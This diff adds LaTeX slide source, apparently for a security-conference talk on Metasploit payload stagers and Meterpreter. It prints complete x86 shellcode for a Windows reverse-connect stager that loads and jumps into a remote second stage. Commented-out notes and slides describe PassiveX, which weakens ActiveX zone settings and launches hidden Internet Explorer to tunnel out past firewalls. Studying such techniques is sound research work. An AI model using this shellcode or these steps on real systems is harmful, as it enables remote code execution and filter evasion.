+        \footnotesize{\url{http://www.nologin.org/Downloads/Papers/remote-library-injection.pdf}}
+        \item Meterpreter \\
+        \footnotesize{\url{http://www.nologin.org/Downloads/Papers/meterpreter.pdf}}
+    \end{sitemize}
+\end{frame}
+
+\appendix
+
+\pdfpart{Appendix: Payload Stagers}
+\section{Windows Ordinal Stagers}
+\subsection{Reverse Ordinal Stager Implementation}
+\begin{frame}[fragile]
+    \frametitle{Locating WS2\_32.DLL's base address}
+
+\footnotesize{
+    \begin{verbatim}
+FC         cld                   ; clear direction (lodsd)
+31DB       xor ebx,ebx           ; zero ebx
+648B4330   mov eax,[fs:ebx+0x30] ; eax = PEB
+8B400C     mov eax,[eax+0xc]     ; eax = PEB->Ldr
+8B501C     mov edx,[eax+0x1c]    ; edx = Ldr->InitList.Flink
+8B12       mov edx,[edx]         ; edx = LdrModule->Flink
+8B7220     mov esi,[edx+0x20]    ; esi = LdrModule->DllName
+AD         lodsd                 ; eax = [esi] ; esi += 4
+AD         lodsd                 ; eax = [esi] ; esi += 4
+4E         dec esi               ; esi--
+0306       add eax,[esi]         ; eax = eax + [esi]
+                                 ; (4byte unicode->ANSI)
+3D32335F32 cmp eax,0x325f3332    ; eax == 2_32?
+75EF       jnz 0xd               ; not equal, continue loop
+
+    \end{verbatim}
+}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Resolve symbols using static ordinals}
+
+\footnotesize{
+    \begin{verbatim}
+8B6A08     mov ebp,[edx+0x8]     ; ebp = LdrModule->BaseAddr
+8B453C     mov eax,[ebp+0x3c]    ; eax = DosHdr->e_lfanew
+8B4C0578   mov ecx,[ebp+eax+0x78]; ecx = Export Directory
+8B4C0D1C   mov ecx,[ebp+ecx+0x1c]; ecx = Address Table Rva
+01E9       add ecx,ebp           ; ecx += ws2base
+8B4158     mov eax,[ecx+0x58]    ; eax = socket rva
+01E8       add eax,ebp           ; eax += ws2base
+8B713C     mov esi,[ecx+0x3c]    ; esi = recv rva
+01EE       add esi,ebp           ; esi += ws2base
+03690C     add ebp,[ecx+0xc]     ; ebp += connect rva
+    \end{verbatim}
+}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Create the socket, connect back, recv, and jump}
+
+\footnotesize{
+    \begin{verbatim}
+; Use chained call-stacks to save space
+; connect returns to recv returns to buffer (fd in edi)
+53         push ebx              ; push 0
+6A01       push byte +0x1        ; push SOCK_STREAM
+6A02       push byte +0x2        ; push AF_INET
+FFD0       call eax              ; call socket
+97         xchg eax,edi          ; edi = fd
+687F000001 push dword 0x100007f  ; push sockaddr_in
+68020010E1 push dword 0xe1100002
+89E1       mov ecx,esp           ; ecx = &sockaddr_in
+53         push ebx              ; push flags (0)
+B70C       mov bh,0xc            ; ebx = 0x0c00
+53         push ebx              ; push length (0xc00)
+51         push ecx              ; push buffer
+57         push edi              ; push fd
+51         push ecx              ; push buffer
+6A10       push byte +0x10       ; push addrlen (16)
+51         push ecx              ; push &sockaddr_in
+57         push edi              ; push fd
+56         push esi              ; push recv
+FFE5       jmp ebp               ; call connect
+\end{verbatim}
+}
+\end{frame}
+
+\end{document}
+
+
+\begin{comment}
+
+
+NOTEZ
+
+First
+
+What aren't we talking about
+  - New exploit vectors
+  - New exploit techniques
+  - Bugs in any shape, size, or form
+
+What is encoding, and why do we do it?
+  - Bad character avoidence, don't need special case payloads for that..
+  - Added bonus of evasion
+  - Nice because you usually just need to write 1 good encoder...
+
+What is staging, and why?
+  - Size problem
+  - Multiple your aresenal, 5 stagers + 5 stages, 10 shellcodes, but 25 payloads
+
+Should move around the ordinal information, explain what ordinals are first.
+Talk about how ordinals are diffined to be static in their .lib
+List some of the limitations for ws2_32 (like no WSASocket, and what that means
+in terms of writing shellcode, pipe shell, etc).
+
+
+Post exploitation.
+
+What's most important to them
+1) Features
+2) Evasion
+3) Technology.
+
+The order we should present is reverse, save the best for last
+
+1) introduce and explain the technology
+  - dll injection
+  - TLV protocol, async, threadsafe, meterp sharing, etc
+  - Ruby APIs (how they emulate the native APIs, native API replacement, etc)
+
+2) explain how this has the added benefit against anti-forensics
+  - no disk access
+  - anti-debugging
+  - page locking / swapping prevention
+  - encryption
+  - connection reuse and tunneling / channels
+  - no filesystem .exe loading...
+
+3) explain the type of features an end-pentester would see
+  - pivoting / portfwd
+  - file upload / download, list, run, etc
+  - channels, multiple command shells, hung terminal doesn't totally fuck you
+  - vnc / idle time stffu (ties into stealthyness)
+
+Possible flashy demos:
+  - migrating
+  - Possibly change window colors, move windows, etc in the process we migrate
+    to.  Was shok's idea, so you could "visualize" the migrate, etc.
+  - Do some flashy no-disk .exe injection, send up an opengl demo!
+
+Interesting asides:
+  - Great for testing (Metatest, bringing you a better Metasploit Framework!)
+  - make a insanely great remote control application (automation)
+
+
+Future stuff:
+  - Botnetesk type stuff / mesh
+  - Listening meterp / multiple control channels / better collaboration..
+
+
+
+OLD ----
+
+
+Notes on post-exploitation
+
+ - Core Impact / Syscall Proxying
+
+  + Mainly written to support their feature set, not to expose it to an end
+    user.  Don't think you're going to get much access to the syscall libraries,
+    they are all written in C and dlls for the most part it seems.
+
+  + you get their nice features, pivoting, file access, minishell, etc, but
+    for anything beyond that, you have to upgrade your agent, and then I don't
+    believe those are using syscall proxying type things anymore.  I think some
+    of them bundle python interpreters...
+
+  + how it works
+  + really cool, and simple
+  + no need to write vicitim-side code for any calls you want to make
+  + inefficent for some types of things (port scanning)
+
+ - CANVAS
+
+ - mosdef
+   - model is very similar to dN
+   - you have to write a client and server component
+   - build environment not seperated, have you write your client side component
+     in wanna-be-aitel c, and have you have it in a python script.
+   - he has an API to do some stuff, but mostly low level stuff, and nothing
+     high level and cool.
+   - like all of his stuff, it's very rough and primitive seeming.  I'm sure,
+     just like spike, you can do some cool stuff with it, but it's like building
+     a car with a rock, or something...
+
+  + Code is dirty....
+  +
+
+\section{PassiveX}
+\subsection{Overview}
+\begin{frame}[t]
+    \frametitle{PassiveX}
+
+    \begin{sitemize}
+        \item Robust payload stager capable of bypassing restrictive
+        outbound filters
+        \item Compatible with Windows 2000+ running Internet
+        Explorer 6.0+
+        \item Uses HTTP to communicate with attacker
+        \item Provides an alternate vector for library injection via
+        ActiveX
+        \item Detailed write-up can be found in reference materials
+    \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+    \frametitle{How PassiveX works}
+
+    \begin{sitemize}
+        \item Enables support for both signed and unsigned ActiveX
+        controls in the \texttt{Internet} zone.
+        \begin{sitemize}
+            \pause
+            \item Necessary because administrators may have disabled
+            ActiveX support for security reasons
+        \end{sitemize}
+
+        \pause
+        \item Launches a hidden instance of Internet Explorer
+
+        \pause
+        \item Internet Explorer loads a page that the attacker
+        has put an embedded ActiveX control on
+
+        \pause
+        \item Internet Explorer loads and executes the ActiveX
+        control
+    \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+    \frametitle{Why is PassiveX useful?}
+
+    \begin{sitemize}
+        \item Relatively small (roughly 400 byte) stager that does not
+        directly interact with the network
+
+        \pause
+        \item Bypasses common outbound filters by tunneling through
+        HTTP
+
+        \pause
+        \item Automatically uses proxy settings defined in Internet
+        Explorer
+
+        \pause
+        \item Bypasses trusted application restrictions (ZoneAlarm)
+
+        \pause
+        \item ActiveX technology allows the attacker to implement
+        complex code in higher level languages (C, C++, VB)
+        \begin{sitemize}
+            \item Eliminates the need to perform complicated tasks
+            from assembly
+            \item ActiveX controls are functionally equivalent to
+            executables
+        \end{sitemize}
+    \end{sitemize}
+\end{frame}
+
+\subsection{Implementation}
+
+\begin{frame}[t]
+    \frametitle{Implementing the PassiveX stager}
+
+    \begin{sitemize}
+        \item Enable download and execution of ActiveX controls
+        \begin{sitemize}
+            \item Open the current user's \texttt{Internet} zone
+            registry key
+            \item Enable four settings
+            \begin{sitemize}
+                \item \texttt{Download signed ActiveX controls}
+                \item \texttt{Download unsigned ActiveX controls}
+                \item \texttt{Run ActiveX controls and plugins}
+                \item \texttt{Initialize and script ActiveX controls not
+            marked as safe}
+            \end{sitemize}
+        \end{sitemize}
+
+        \pause
+        \item Launch a hidden instance of Internet Explorer pointed
+        at a URL the attacker controls
+
+        \pause
+        \item Internet Explorer then loads and executes the attacker's
+        ActiveX control
+    \end{sitemize}
+\end{frame}
+
+\subsection{Example ActiveX: HTTP Tunneling Control}
+\begin{frame}[t]
+    \frametitle{An example ActiveX control}
+
+    \begin{sitemize}
+        \item ActiveX controls may choose to build an HTTP tunnel
+        to the attacker
+        \item HTTP tunnels provide a streaming connection over HTTP
+        requests and responses
+        \item Useful for tunneling other protocols, like TCP,
+        through HTTP
+
+        % TODO: elaborate?
+    \end{sitemize}
+\end{frame}
+
+\subsection{Pros \& Cons}
+\begin{frame}[t]
+    \frametitle{Pros \& cons}
+
+    \begin{sitemize}
+        \item \textbf{Pros}
+        \begin{sitemize}
+            \item Bypasses restrictive outbound filters at both a
+            network and application level
+
+            \pause
+            \item Provides a method for using complex code written
+            in a high-level language
+        \end{sitemize}
+
+        \pause
+        \item \textbf{Cons}
+        \begin{sitemize}
+            \item Does not work when run as a non-privileged user
+            \begin{sitemize}
+                \item Internet Explorer refuses to download ActiveX
+                controls
+            \end{sitemize}
+
+            \pause
+            \item Requires the ActiveX control to restore
+            \texttt{Internet} zone settings
+            \begin{sitemize}
+                \item May leave the machine vulnerable to compromise
+                if not done
+            \end{sitemize}
+        \end{sitemize}
+
+    \end{sitemize}
+\end{frame}
+
+\end{comment}
